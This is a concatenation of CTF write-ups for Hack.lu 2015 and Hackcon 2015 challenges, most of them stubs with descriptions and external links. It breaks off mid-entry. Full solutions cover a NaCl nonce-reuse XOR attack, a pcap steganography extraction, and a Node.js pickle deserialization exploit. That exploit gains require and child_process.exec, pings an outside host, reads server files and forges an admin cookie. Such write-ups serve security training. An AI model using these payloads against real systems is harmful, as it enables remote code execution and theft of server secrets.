> response: b"e\xc8\x9b\xc4\xfd\x04\x9b\x843a\x940U\xc4\x7fa\x11W\xa9uf\xa9\xf4%\r6C\x8d\xe1Z\x95\xb1^\x92\xddF\xa7\xbb\x86\x19\xbaCW\xde\x9bo\xd3Z\x8d\x85kx\x81a\xb0\x0b\xc9\x14'L\xc6i\xc4V\x86=\xba\x11~\xcc\x9bw#i\xc7\xb2\xc0Z\x9d\x1d\xb3\x96\\\xf9\xffG\x8a\xa2"
> 
> That crypto is pretty much invincible - after all, they're using NaCl - but maybe you can figure out some crazy attack anyway? I count on you!!!
> 
> You need to install the "pynacl" python module for python 3 to make this work.
> 
> connect to school.fluxfingers.net:1512
> [download](salt_public_a2b3540e79e8628946ab873ffbeacc29.tar.gz)


## Write-up

by [derlaft](https://github.com/derlaft)

Let's see what do we have here. Client generates an assymetric keypair ([Box NaCl](http://nacl.cr.yp.to/box.html) is used) and sends an encrypted and signed message to a server:

      req = my_sk.public_key.encode() + bytes([command]) + box.encrypt(data.encode('utf8'), nonce)

Box signs the request, so there is no reason to change public key or encrypted data. Hovewer, we can change the command (it's just 0x00 for CMD_STORE and 0x01 for CMD_LOOKUP request).

These commands have different numbers of arguments which are separated by a '#' symbol. If server recieves an incorrect number of arguments for a command, it returns an error. Very large encrypted error.

    if cmd == CMD_STORE:
      if len(params) < 2:
            return reply("you need to send more parameters! seriously, why would you just send one parameter? I should just let this fail with a silent error. sending just one parameter is stupid.")

How can we use it? Let see how server encrypts response. It takes client's [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce) and increments it:

    # the client already picked a random nonce for the request, so we can just increment it by one for the reply
    answer_nonce = bytes([nonce[0] + 1]) + nonce[1:]
      def reply(str):
          s.sendall(my_box.encrypt(str.encode('utf8'), answer_nonce))

Great. It means that we can get that known response encrypted with the _same_ nonce and key. (You can check it by sending captured request and comparing an answer with the known one. They should be the same). Now we need to find out how Box encryption works.

According to the Internet, "Box uses Curve25519, XSalsa20 and Poly1305 to encrypt and authenticate messages". Curve25519 is some weird elliptic stuff, and Poly1305 is used for signing, so the encryption algorithm is XSalsa20. [The first 32 bytes of the output of XSalsa20 are used for the MAC, the rest are xored into the plaintext to encrypt it.](http://stackoverflow.com/a/13663945)

Wait, is that just a XOR? Solution becomes super-easy because of XOR properties:

    ((text XOR key) XOR (known_text XOR key) XOR (known_text) == text XOR (known_text XOR known_text) XOR (key XOR key) == text XOR 1 XOR 1 == text)
  
So we have only to perform this XOR:

      #!/usr/bin/env python3
      PLAINTEXT=b'you need to send more parameters! seriously, why would you just send one parameter? I should just let this fail with a silent error. sending just one parameter is stupid.'
    CIPHERTEXT=b"e\xc8\x9b\xc4\xfd\x04\x9b\x843a\x940U\xc4\x7fa\x11W\xa9uf\xa9\xf4%\r6C\x8d\xe1Z\x95\xb1^\x92\xddF\xa7\xbb\x86\x19\xbaCW\xde\x9bo\xd3Z\x8d\x85kx\x81a\xb0\x0b\xc9\x14'L\xc6i\xc4V\x86=\xba\x11~\xcc\x9bw#i\xc7\xb2\xc0Z\x9d\x1d\xb3\x96\\\xf9\xffG\x8a\xa2"
    
      # that is what we get if we re-send captured request with a 0x00 changed to 0x01
      # only PLAINTEXT is encrypted here
      RECV=b"e\xc8\x9b\xc4\xfd\x04\x9b\x843a\x940U\xc4\x7fa\x11W\xa9uf\xa9\xf4%\xcco\x95\xb8i\x10`Tz\xd6`\x8bJ&<i\xa5@C\x99\x8ed\xd9a\xce\x83}(\x86k\x81\x06\x9a&!P\xd5 \xdaT\x9d>\xbb\x11U\xc8\x8eek'\xc7\xa3\xed@\x86\x1d\xb0\x93A\xbc\xabI\x9f\xd1\xbcp\xf8\x1a\xba2u\xf8\x88\x05H\x16\xfe\xafX8K)\x03\xbb'&\x01\xcc\xaf\x1f\x1a{\x9dB\xb1\xb7\xc7\x17\x9ahe\x80'\x13\xdbG`\xf8~L\xcf@\x04Q\x97\xac\xf5\x157\x83b\xd4\x086\x08\xb1\xeb7\xf8*\xcf\x8a]q\xb1=\xc8\xd2\xb6\xc8\xdc\xf2)\x8e\x13\xd2\x16`\x84&Wn^\xce\xa8\x84\x9e\xc0\xeb\xb2\xc2\xcc\x92\xaf\x10\xad$c\x13\x92\xae]\x87\x83\x0c\x8a.D\xdf\xe0\xbf\x12\x87 \x11:"
      XOR=lambda s1,s2: bytes([(a ^ b) for a,b in zip(s1,s2)])

    # Messages have some tech data in the beginning: MAC and other stuff
    # I was too lazy to calculate the correct shift, so let's just iterate
    for i in range(23,42): 
        print( XOR(CIPHERTEXT[i:], XOR(RECV[i:], PLAINTEXT)) )

Result:

      ...
      b'flag{no_crypto_is_invincible_against_stupidity}\n'
      ...

## Other write-ups and resources

* <https://der.ttyh.ru/blag/post/salt-writeup/>
# Hack.lu CTF 2015: Bookstore

**Category:** Exploiting
**Points:** 200
**Solves:** 23
**Description:**

> Man, collgebooks are so damn expensive! I bet it makes sense to pwn the local bookstore to find some way to get those darn books without paying. Luckily you've found their ordering system! And it's sooooo buggy ...
> 
> Download: [Books](books_757b0a24b0193ec8989290ec6923dd1d)
> Service: nc 149.13.33.84 1519


## Write-up

(TODO)

## Other write-ups and resources

* <http://tukan.farm/2016/02/25/hacklu-2015-bookstore-writeup/>
# Hack.lu CTF 2015: Course Creator!

**Category:** Exploiting
**Points:** 500
**Solves:** 8
**Description:**

> It is Monday and you are sitting in your chemistry class (what a giant waste of time). While barley awake and still intoxicated from your epic weekend adventure you are trying to follow what the hell the guy in front is talking about.
> 
> After sitting there for a while and feeling like shit. Oh boy the alcohol. Your classmate -- that arrogant prick, who's the favorite of every teacher -- asks you how the studying is going. All you could think of in this moment is "Wtf, have you looked at me, does this look like I've been wasting my time studying for this garbage?!" But then it hit you, FUCK!, your chemistry exam is coming up in three days and you obviously didn't do shit!
> 
> Suddenly completely awake you are trying to figure out how to get out of that mess. But actually studying is not an option ... But then you get an idea: Your chemistry teacher is also your computer science teacher and you heard rumors that his webskills suck. In computer science last week, you got the assignment to program an online course creator (piece of cake) BUT he also gave out a binary as an example which is also running on his own private server where he tends to keep all his tests, grades and everything a lazy student like you would love to get his hands on!
> 
> All you can think of right now is JACKPOT!, let's see if his C skills are as good as his Web skills. Your goal is to get a shell on the server -- it might help you out with your dilemma.
> 
> Download: [Course Creator](course_creator_cdc4c575f7bf08f82d0536c17e2f7b47)
> Service: nc 149.13.33.84 1520 


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/acama/ctf/blob/master/hacklu2015/course_creator/x.py>
# Hack.lu CTF 2015: Dragbox

**Category:** Exploiting
**Points:** 350
**Solves:** 10
**Description:**

> We don't like using the cloud at school, so we made our own school internal file sharing service. It is innovative! Just drag (that's why it's called Dragbox) a file* into a share you created in the program and instantly share it with everyone else who knows the secret share name! This is simply the best** way to collaborate*** since the invention of the internet!****
> 
> * dragging and dropping might not actually be implemented yet
> ** might not be objectively true
> *** excessive collaboration on homework is discouraged
> **** timespan of bestness is not guaranteed
> 
> Your goal is to download the file /flag (in the server's filesystem root).
> 
> connect to school.fluxfingers.net:1526
> [download](dragbox_public_ca7d599b5da687bb24a89a2b8965a71b.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2015: Petition Builder

**Category:** Exploiting
**Points:** 400
**Solves:** 6
**Description:**

> Some students who like complaining too much set up a petition platform in order to solve their problems. Unfortunately it is abused to avoid learning and to get teachers fired.
> Now a teacher who was removed from the school without a solid reason (the students just didn't like the subjects he taught) is seeking for revenge and asked you for help. He already found the platform the students have used to get rid of him.
> 
> [Petition Builder](https://school.fluxfingers.net:1531/)


## Write-up

(TODO)

## Other write-ups and resources

* <http://wapiflapi.github.io/2015/10/29/eight-byte-shell/>
# Hack.lu CTF 2015: Stackstuff

**Category:** Exploiting
**Points:** 150
**Solves:** 56
**Description:**

> Welcome to the Progressive Secure Coding course! Here, you will learn how to properly secure your software without making it too slow. For example, you should use C. And compile your code for 64bit, because then you don't need stack cookies, the pointers are random enough.
> 
> Test your attack on a box with Linux >=3.4!
> 
> connect to school.fluxfingers.net:1514
> [download](stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <http://toh.necst.it/hack.lu/2015/exploitable/StackStuff/>
* <https://github.com/ByteBandits/writeups/blob/master/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar/README.md>
# Hack.lu CTF 2015: Dr. Bob

**Category:** Forensic
**Points:** 150
**Solves:** 54
**Description:**

> There are elections at the moment for the representative of the students and the winner will be announced tomorrow by the head of elections Dr. Bob. The local schoolyard gang is gambling on the winner and you could really use that extra cash. Luckily, you are able to hack into the mainframe of the school and get a copy of the virtual machine that is used by Dr. Bob to store the results. The desired information is in the file /home/bob/flag.txt, easy as that.
> 
> [dr_bob_e22538fa166acecc68fa17ac148dcbe2.tar.gz](https://school.fluxfingers.net/static/chals/dr_bob_e22538fa166acecc68fa17ac148dcbe2.tar.gz)
> [mega.nz mirror](https://mega.nz/#!qoUDxYrB!W-C6vZxiulkaZ9ONWbyohCpAOfRbLtvHIgIICvjeZWk)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Dr.%20Bob%20%5Bforensics%5D%20(150)>
* <https://research.g0blin.co.uk/hack-lu-ctf-2015-dr-bob-writeup/>
* <https://github.com/ufologists/write-ups/tree/master/hacklu15/forensics/drbob150>
* <https://github.com/xwings/tuya/tree/master/ctf2015/hack.lu/drbob150>
* <https://w00tsec.blogspot.de/2015/10/hacklu-2015-ctf-write-up-dr-bob.html>
* [Vietnamese](https://blog.0x1115.org/2015/10/22/hack-lu-2015-ctf-o-cung-cua-dr-bob-bi-ma-hoa/)
# Hack.lu CTF 2015 CTF write-ups

* [http://school.fluxfingers.net/](http://school.fluxfingers.net/)
* [Scoreboard](https://school.fluxfingers.net/scoreboard) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/salt](crypto/salt)
* [web/teachers-pinboard](web/teachers-pinboard)

## External write-ups only

* [coding/guess-the-number](coding/guess-the-number)
* [coding/perl-golf](coding/perl-golf)
* [coding/php-golf](coding/php-golf)
* [crypto/checkcheckcheck](crypto/checkcheckcheck)
* [crypto/creative-cheating](crypto/creative-cheating)
* [crypto/formular-generator](crypto/formular-generator)
* [exploiting/course-creator](exploiting/course-creator)
* [exploiting/petition-builder](exploiting/petition-builder)
* [exploiting/stackstuff](exploiting/stackstuff)
* [forensic/dr-bob](forensic/dr-bob)
* [reversing/secret-library](reversing/secret-library)
* [reversing/solution-checker](reversing/solution-checker)
* [reversing/zoo](reversing/zoo)
* [web/bashful](web/bashful)
* [web/champion](web/champion)
* [web/grading-board](web/grading-board)
* [web/module-loader](web/module-loader)
* [web/prof-m-eista-hax](web/prof-m-eista-hax)

## Missing write-ups

* [coding/speedrun](coding/speedrun)
* [crypto/campus-id-sso](crypto/campus-id-sso)
* [exploiting/bookstore](exploiting/bookstore)
* [exploiting/dragbox](exploiting/dragbox)# Hack.lu CTF 2015: Secret Library

**Category:** Reversing
**Points:** 200
**Solves:** 71
**Description:**

> Books are a great thing. And since libraries are a big amount of books you can read in one place, they're great, too.
> 
> But this secret library some guys started is a bit different. You have to know the exact title of a book to get it, you can't look around. So you have to know another person in the library who knows some book titles or you won't be able to read anything. A bit like an invite-only library.
> 
> This whole thing seems weird. Could you poke around and try to figure out what they're up to? If you could grab one of their books, that would be awesome.
> 
> connect to school.fluxfingers.net:1527
> [download](secret_library_75904fb763267c629e729fa4a5c4d967)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/duc-le/ctf-writeups/blob/master/2015_hack.lu_CTF/%2318_Secret_Library/writeup.md>
# Hack.lu CTF 2015: Solution Checker

**Category:** Reversing
**Points:** 400
**Solves:** 21
**Description:**

> Your teacher is tired of answering all the mails about the correct solutions to the homework. So he made a tool to check if the answers are correct.
> You can download this tool [here](SolutionChecker_52e5abfabf05e13e688a72091b09ed28.exe).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/Septyem/CTF-writeups/tree/master/hack.lu2015/SolutionChecker>
# Hack.lu CTF 2015: Zoo

**Category:** Reversing
**Points:** 350
**Solves:** 15
**Description:**

> Instead of sitting in the classroom, let's go to the zoo today and look at some strange animals!
> You'll need a license key for entering though. Can you make one?
> 
> connect to school.fluxfingers.net:1532
> [download](zoo_e53acc6856a0e20f5d0a479081f18911.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/duc-le/ctf-writeups/blob/master/2015_hack.lu_CTF/%2324_Zoo/writeup.md>
# Hack.lu CTF 2015: Bashful

**Category:** Web
**Points:** 200
**Solves:** 140
**Description:**

> "How did I end up here?" is the only question you can think of since you've become a high school teacher. Let's face it, you hate children. Bunch of egocentric retards. Anyway, you are not going to take it anymore. It's time to have your little midlife crisis right in the face of these fuckers.
> 
> 
> Good thing that you're in the middle of some project days and these little dipshits wrote a simple message storing web application. How cute. It's written in bash... that's... that's... aw- no... bashful. You've got the source, you've got the skills. 0wn the shit out of this and show them who's b0ss.
> 
> 
> [Challenge](https://school.fluxfingers.net:1503/)
> [Source](bashful_a77db9359a404ec7443d6455152e54b6.tar.bz2)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Bashful%20%5Bweb%5D%20(200)>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: Champion

**Category:** Web
**Points:** 200
**Solves:** 6
**Description:**

> I'm the champion of jump and run, and I have a problem.
> After a quick look at this new game, I told everyone I could certainly play through it in under 5000 ticks. But now they expect me to do it, and in my first few attempts, I couldn't quite reach that. Normally, I would just send the highscore I should have gotten to the highscore server directly, but this game is doing something weird. Can you help me?
> 
> [service](https://school.fluxfingers.net:1504/)
> [full sources (in case you need them)](champion_public_dece0af07079b98edb08876422e1e7c6.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.youtube.com/watch?v=EbeXJzgaPCQ> and <https://www.youtube.com/watch?v=YYipvs62fA8>
# Hack.lu CTF 2015: Grading Board

**Category:** Web
**Points:** 300
**Solves:** 46
**Description:**

> You are sitting in your computer science class and are already done with your assignment (well, who would have guessed that). But you know that even though you did a perfect job (obviously) your teacher will give you a shitty grade because he can't stand your face.
> 
> Well well well, it is time to put your skills on the table and show that son of a ... (you know the word I am looking for)... who the boss is. Thanks to the Ashley Madison dump and the stupidity of your teacher (seriously, how can he even teach the class...) you got the login credentials to the grading board.
> 
> But, unlucky for you, your shithead of class mate found a vulnerability inside the website and went all whitehat on that shit and reported it (believe me I know ....in a different world...), he was also tasked to improve the security of the system.
> 
> Fortunately for you, he left his phone unlocked and unattended, which allowed you to forward yourself the email containing the patch for the website, .... end to end encryption out of the window right there....,
> 
> Alright son, get your shit together and let's get cracking
> 
> Here is the [patch](patch_953dc87b784435d237b33a4f2fc20612.diff)!
> And the [Website](https://school.fluxfingers.net:1506/)
> 
> The login credentials are:
> Username: kdavis
> Password: trolo!Fool


## Write-up

(TODO)

## Other write-ups and resources

* <http://wget.pw/posts/hacklu-ctf-2015-grading-board-web-300>
# Hack.lu CTF 2015: Module Loader

**Category:** Web
**Points:** 100
**Solves:** 219
**Description:**

> Since his students never know what date it is and how much time they have until the next homework's deadline, Mr P. H. Porter wrote a little webapp for that.
> You can find it [here](http://school.fluxfingers.net:1522/).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Module%20Loader%20%5Bweb%5D%20(100)>
# Hack.lu CTF 2015: Prof. M. Eista Hax

**Category:** Web
**Points:** 300
**Solves:** 17
**Description:**

> Professor M. Eista Hax uses a digital tool to manage all his students. He is very happy with the system, but it does have one drawback: it does not support multiple users. This is a problem, because M. Eista Hax has employees who need access as well. To solve this he writes a super modern, highly encrypted web application to share the password with authorized users. Problem solved.
> 
> So... Get that key!
> [Link](https://school.fluxfingers.net:1501/)


## Write-up

(TODO)

## Other write-ups and resources

* <http://secgroup.github.io/2015/10/23/hacklu2015-writeup-prof-m-eista-hax/>
# Hack.lu CTF 2015: Teacher's Pinboard

**Category:** Web
**Points:** 350
**Solves:** 9
**Description:**

> I found the address of the [teacher's pinboard](https://school.fluxfingers.net:1502/)!
> Can you try to get in and read all teachers' notes?
> Maybe you need to attack the admin account as well.


## Write-up

by [agix](https://github.com/agix)

The application seems to be almost client side only. Login and registration are on the same form and you can login with the "admin" username.

It gives you access to new notes that you can modify and which would be stored in your localStorage with a PBKDF2 derived key of your password.

What's interesting here is the javascript file named pickle.js. Indeed one of the cookies is pickled.

`accountinfo=(dp0%0AS'username'%0Ap1%0AS'admin'%0Ap2%0AsS'password'%0Ap3%0AS'toto'%0Ap4%0AsS'admin'%0Ap5%0AI00%0As.`

Even if pickle seems to be the same as in python, the server is using Express (so it's a custom JavaScript implementation).

Reading the pickle.js source code show us `this` usage that doesn't exist in browser context. That suggests an adapted version of pickle.js is used on the server side.

It's easy to adapt the lib so it could be used as a NodeJS module (http://www.matteoagosti.com/blog/2013/02/24/writing-javascript-modules-for-both-browser-and-node/)

Now we can test pickle in server side context !

The Pickle syntax uses a stack to push and pop argument in various format, let's see what interesting features we have:

```
case REDUCE:
    var args = stack.pop();
    var func = stack.pop();
    var value = func.apply(this, args);
    stack.push(value);
    break;
```
If we push a function and an array of arguments we can execute it ! So we have to find a way to push a function.

```
case GLOBAL:
    var modulename = readline().slice(0,-1);
    var name = readline().slice(0,-1);
    var className = findClass(modulename, name);
    stack.push(className);
    break;
```
Basically, `findClass` takes two strings, a modulename and a name. It looks if modulename exists in `this` and returns `this[modulename][name]` if name exists in `this[modulename]`.

A blacklist of dangerous functions prevents usage of `eval` or `require`...

`BLACKLIST = ["require", "eval", "setTimeout", "setInterval", "setImmediate"];`

A well known technique used by [metasploit](https://github.com/gojhonny/metasploit-framework/blob/master/lib/msf/core/payload/nodejs.rb#L10) to retrieve the `require` function is to call `this.process.mainModule.constructor._load`.

So, if we use GLOBAL with `'process'` and `'mainModule'` arguments we can stack the `mainModule` object. How could we get access to `constructor` then `_load` as there is no case to pop object and push an arbitrary element of this object?

The way we found is to link the retrieved `mainModule` object into `this` so `this.mainModule` would exist and we could call GLOBAL to retrieve  `constructor` and do it again to retrieve `_load`.

To do that we used SETITEM :

```
case SETITEM:
    var value = stack.pop();
    var key = stack.pop();
    var obj = stack.pop();
    obj[key] = value;
    stack.push(obj);
    break;
```

If we push `this`, then an arbitrary string name (for the key), then the `mainModule` object, SETITEM will add it to this \o/.

How can we get `this` object on the stack ? Call GLOBAL with `'global'` and `'global'` !

Indeed, `global` is a circular reference to itself so `this.global.global === this`.

We have everything we need to retrieve the `require` function!

```
var pickle = ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
// now `this` is on the stack
"S'a'\n"+ // push arbitrary String 'a' (arbitrary key name)
"c"+ // GLOBAL
"process\n"+ //moduleName
"mainModule\n"+ //name
// now we got [`this`, 'a', `process.mainModule`]
"s"+ // SETITEM
// `this` has a new parameter named 'a' which is the mainModule object !
// we do it again for constructor
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'b'\n"+ // push arbitrary String 'b'
"c"+ // GLOBAL
"a\n"+ //moduleName
"constructor\n"+ //name
// now we got [`this`, 'b', `process.mainModule.constructor`]
"s"+ // SETITEM
// and again for `_load`
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'rekire'\n"+ // push arbitrary String 'rekire'
"c"+ // GLOBAL
"b\n"+ //moduleName
"_load\n"+ //name
// now we got [`this`, 'rekire', `process.mainModule.constructor._load`]
"s" // SETITEM
```

We have an equivalent of the `require` function directly callable from `this.rekire`, so now we can `require` any library and use the same technique to retrieve any function.

```
pickle += ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'cp'\n"+ // push arbitrary String 'cp'
"c"+ // GLOBAL
"global\n"+ //moduleName
"rekire\n"+ //name
"("+ // a marker used to define the begining of something
"S'child_process'\n"+ // 'child_process' String
"l"+ // l create an array of elements until the marker
// stack looks like [`this`, 'cp', `this.rekire`, ['child_process']]
"R"+ // REDUCE apply `this.rekire` on 'child_process'
// stack looks like [`this`, 'cp', `child_process`]
"s"+ // SETITEM so we have this.cp accessible
"c"+ // GLOBAL
"cp\n"+ //moduleName
"exec\n"+ //name
"("+
"S'ping secret-in.me'\n"+
"l"+ // push pop 'ping secret-in.me' and push ['ping secret-in.me']
"R"+ // apply `cp.exec` on 'ping secret-in.me'
"." // the end
```

We tried `child_process.execSync` but the server version didn't appear to support it and `child_process.exec` in asynchronous mode didn't allow us to do any connect back...

We need a way to get some information back in the response.

If we send this kind of cookie (don't forget to encode \n in %0A) we can see in the response :

`Could not establish your login, <em>undefined</em>. Please try logging in again.`

The original cookie is a kind of dict `{username: 'admin', password: 'admin', admin: 0}`

If we send `(dp0\nS'username'\np1\nS'test's.` we get the error `Could not establish your login, <em>test</em>. Please try logging in again.`

The idea is to create `{username: 'leaked content'}`.

And that's all ! Using `fs.readdirSync` and `fs.readFileSync` we can leak directory content and dump the whole source code !


HERE IS THE WHOLE PICKLE DEFINITION

```
var pickle = ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
// now `this` is on the stack
"S'a'\n"+ // push arbitrary String 'a' (arbitrary key name)
"c"+ // GLOBAL
"process\n"+ //moduleName
"mainModule\n"+ //name
// now we got [`this`, 'a', `process.mainModule`]
"s"+ // SETITEM
// `this` has a new parameter named 'a' which is the mainModule object !
// we do it again for constructor
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'b'\n"+ // push arbitrary String 'b'
"c"+ // GLOBAL
"a\n"+ //moduleName
"constructor\n"+ //name
// now we got [`this`, 'b', `process.mainModule.constructor`]
"s"+ // SETITEM
// and again for `_load`
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'rekire'\n"+ // push arbitrary String 'rekire'
"c"+ // GLOBAL
"b\n"+ //moduleName
"_load\n"+ //name
// now we got [`this`, 'rekire', `process.mainModule.constructor._load`]
"s" // SETITEM

pickle += ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'fs'\n"+ // push arbitrary String 'fs'
"c"+ // GLOBAL
"global\n"+ //moduleName
"rekire\n"+ //name
"("+ // a marker used to define the begining of something
"S'fs'\n"+ // 'fs' String
"l"+ // l create an array of elements until the marker
// stack looks like [`this`, 'fs', `this.rekire`, ['fs']]
"R"+ // REDUCE apply `this.rekire` on 'fs'
// stack looks like [`this`, 'fs', `fs`]
"s"+ // SETITEM so we have this.fs accessible

"(dp0\nS'username'\np1\n"+

"c"+ // GLOBAL
"fs\n"+ //moduleName
"readFileSync\n"+ //name
"("+
"S'/home/notesbin/sickle/notesbin/routes/account.js'\n"+
"l"+ // push pop 'ping secret-in.me' and push ['ping secret-in.me']
"R"+ // apply `cp.exec` on 'ping secret-in.me'
"s"+ // create dict {username: contentOfFile}
"." // the end
```

/home/notesbin/sickle/notesbin/routes/account.js

```
var express = require('express');
var router = express.Router();
var crypto = require('crypto');
const HMAC_KEY = 'gkcB2CSY1VZ7sri2dmafyyHl0qa8tJ65'; // not the flag. you must become admin.

/* GET users listing. */
router.get('/', function(req, res, next) {
  // sign-up form
  res.render('account_index', { error: req.query.error, title: "Sign up" });
});

router.post('/create', function (req, res, next) {
  // sign-up form receiver
  if (req.body) {
    if (('password' in req.body) && ('username' in req.body)) {
      u = req.body.username.replace(/[^a-zA-z0-9]/g,''); // protect against
      p = req.body.password.replace(/[^a-zA-z0-9]/g,''); // …injections

      var accountinfo = "(dp0\nS'username'\np1\nS'"+u+"'\np2\nsS'password'\np3\nS'"+p+"'\np4\nsS'admin'\np5\nI00\ns."
      var signature = crypto.createHmac('sha256', HMAC_KEY);
      signature.update(accountinfo);
      res.cookie('accountinfo', accountinfo, { maxAge: 31536000 }) // 1 year
      res.cookie('signature', signature.digest('hex'), { maxAge: 31536000 })
    }
    res.redirect("/"); // this is the absolute path, /
  }
  else {
    res.redirect('/?error'); // this is the relative path /account/?error
  }
  res.end();
});
router.get('/logout', function (req, res, next) {
  res.clearCookie('accountinfo');
  res.clearCookie('signature');
  res.redirect("/");
  res.end();
});

module.exports = router;
```

`not the flag. you must become admin`

We can now sign our cookie with admin set to 1 !


```
var crypto = require('crypto');
var accountinfo = "(dp0\nS'username'\np1\nS'agix'\np2\nsS'password'\np3\nS'agix'\np4\nsS'admin'\np5\nI01\ns."

const HMAC_KEY = 'gkcB2CSY1VZ7sri2dmafyyHl0qa8tJ65';

var signature = crypto.createHmac('sha256', HMAC_KEY);
signature.update(accountinfo);
console.log(signature.digest('hex'));

console.log(escape(accountinfo));
```

`The flag is:<pre>Jg7CGdFs3GaefwlPP8L3gPcnfY6hg9XV</pre>`

## Other write-ups and resources

* <https://frederik-braun.com/teachers-pinboard-hack-lu-2015.html>
# Hackcon 2015: And So On 

**Category:** Binary
**Points:** 75
**Author:** [Gurshabad Grover](https://github.com/gurshabad)
**Difficulty:** Medium
**Description:** 

The flag is in the form of two words separated by an underscore.

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/and-so-on.html>
# Hackcon 2015: Let's Learn Debugging

**Category:** Binary
**Points:** 75
**Author:** [Sambhav Satija](https://github.com/darkryder)
**Difficulty:** Medium
**Description:** 

The program apparently once could print more than stories.

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/lets-learn-debugging.html>
# Hackcon 2015: I'd love to turn you on

**Category:** Crypto
**Points:** 100
**Author:** [Gurshabad Grover](https://github.com/mvachher)
**Difficulty:** Hard
**Description:** 

[Problem Text](problem.txt)

The flag is in all uppercase letters without spaces.

This is a crypto challenge. Only the highlighted parts are important to get to know what you have to do. What you have to do it on, is the name of the song.

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/id-love-to-turn-you-on.html>
# Hackcon 2015: Steal the Diamond

**Category:** Crypto
**Points:** 25
**Author:** [Mayank Vachher](https://github.com/mvachher)
**Difficulty:** Easy
**Description:** 

D4RKBLU3 is a novice cracker and is starting to learn the basics of Cryptography.
He comes across this encryption system which uses the following python function to encrypt data:

    def enc(message, key):
        message = message.decode('hex')
        key = key.decode('hex')
        return (''.join(chr(ord(k)^ord(c)) for c,k in zip(message,itertools.cycle(key)))).encode('hex')

D4RKBLU3 used this function to encode the message "omg thisisfoobar" with two keys.

He tried devising a complex system which he claims cannot be broken.
He just provided us with the following flowchart and the final result after using 2 layer encryption.
    
              a
             / \
      key1  /   \  key2
           /     \
          b       c
           \     /
      key2  \   /  key1
             \ /
              d
    

    a = "omg thisisfoobar"
    d = "0b59154b16041c400e1c121f180c0416"

He used the above mentioned system in such a way that enc(b,c) gave out his password. Are you smart enough to find his password?

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/steal-the-diamond.html>
# Hackcon 2015: Watch me surf the internet

**Category:** Binary
**Points:** 75
**Author:** [Aneesh Dogra](https://github.com/lionaneesh)
**Difficulty:** Medium
**Description:** 

> Get the flag from the pcap file in the directory.

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a very good writeup by [vimvaders](http://vimvaders.github.io/hackcon2015/2015/08/20/watch-me-surf-the-internet.html).

We are given a gzip compressed pcap that we first uncompress using `gunzip spying.pcapng.gz`.

Looing at the traffic conversation with `wireshark` or `tshark`, we notice nothing that stands out.

However, the author hid the flag in the source port of some TCP requests.

There are several tcp requests that originate from ports such as `10102` or `10114` - all slightly over `10000`.
If one subtracts `10000` from each of these ports, you'll get a decimal ASCII character string: `102` for `f`, `114` for `r`.

As the writeup by vimvader suggests, you can solve this programmatically using a simple combination of `tshark` and `python`:

```bash
$ tshark -r spying.pcapng -Y 'ip.dst == 192.168.64.22' -T fields -e tcp.srcport | python -c 'import sys; print "".join(chr(int(port) - 10000) for port in sys.stdin.readlines())'
fl46: IJustMadeYouWatchMeSurfTheInternet
```

The flag is `IJustMadeYouWatchMeSurfTheInternet`.

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/watch-me-surf-the-internet.html>
# Hackcon 2015: Frag Grenade

**Category:** Misc
**Points:** 50
**Author:** [Mayank Vachher](https://github.com/mvachher)
**Difficulty:** Medium
**Description:** 

Flag is [here](fragG.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/frag-grenade.html>
# Hackcon 2015: Ninja Turtles

**Category:** Misc
**Points:** 25
**Author:** [Gurshabad Grover](https://github.com/gurshabad)
**Difficulty:** Easy
**Description:** 

[Ninja Turtles](ninjaturtles.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/ninja-turtles.html>
# Hackcon 2015: Surprise, Modafocka

**Category:** Misc
**Points:** 75
**Author:** [Mayank Vachher](https://github.com/mvachher)
**Difficulty:** Medium
**Description:** 

[Surprise Surprise](surprise_muthafuka.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/surprise-modafocka.html>
# Hackcon 2015: Did you mean

**Category:** Pwnage
**Points:** 50
**Author:** [Aneesh Dogra](https://github.com/lionaneesh)
**Difficulty:** Medium
**Description:** 

[Pwnie](pwnie)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://vimvaders.github.io/hackcon2015/2015/08/20/did-you-mean.html>

### Meta
